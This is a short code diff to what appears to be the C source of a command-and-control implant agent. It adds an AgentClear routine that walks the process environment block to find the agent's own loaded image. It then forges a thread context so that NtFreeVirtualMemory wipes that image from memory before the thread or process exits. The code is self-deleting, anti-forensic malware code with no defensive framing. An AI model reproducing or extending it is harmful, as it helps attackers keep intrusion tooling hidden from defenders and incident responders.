@@ -47,4 +47,34 @@ void AgentMain()
 
 	g_Agent->commander->Exit(packerOut);
 	g_Connector->SendData(packerOut->GetData(), packerOut->GetDataSize(), &recvDataSize);
+	AgentClear(g_Agent->config->exit_method);
+}
+
+void AgentClear(int method)
+{
+	PPEB Peb = NtCurrentTeb()->ProcessEnvironmentBlock;
+	PLIST_ENTRY modList = &Peb->Ldr->InLoadOrderModuleList;
+	PVOID moduleAddr = ((PLDR_DATA_TABLE_ENTRY)modList->Flink)->DllBase;
+	
+	ULONG elfanew    = ((PIMAGE_DOS_HEADER)moduleAddr)->e_lfanew;
+	DWORD moduleSize = (((PIMAGE_NT_HEADERS)((PBYTE)moduleAddr + elfanew))->OptionalHeader.SizeOfImage);
+
+	CONTEXT ctx = { 0 };
+	ctx.ContextFlags = CONTEXT_FULL;
+	ApiWin->RtlCaptureContext(&ctx);
+
+	ctx.Rip = (DWORD64) ApiNt->NtFreeVirtualMemory;
+	ctx.Rsp = (DWORD64) ((ctx.Rsp & ~(0x1000 - 1)) - 0x1000);
+	ctx.Rcx = (DWORD64) NtCurrentProcess();
+	ctx.Rdx = (DWORD64) (&moduleAddr);
+	ctx.R8 = (DWORD64) (&moduleSize);
+	ctx.R9 = (DWORD64) MEM_RELEASE;
+
+	if (method == 1)
+		*(ULONG_PTR volatile*)(ctx.Rsp + (sizeof(ULONG_PTR) * 0x0)) = (UINT_PTR) ApiNt->RtlExitUserThread;
+	else if (method == 2)
+		*(ULONG_PTR volatile*)(ctx.Rsp + (sizeof(ULONG_PTR) * 0x0)) = (UINT_PTR) ApiNt->RtlExitUserProcess;
+
+	ctx.ContextFlags = CONTEXT_FULL;
+	ApiNt->NtContinue(&ctx, FALSE);
 }
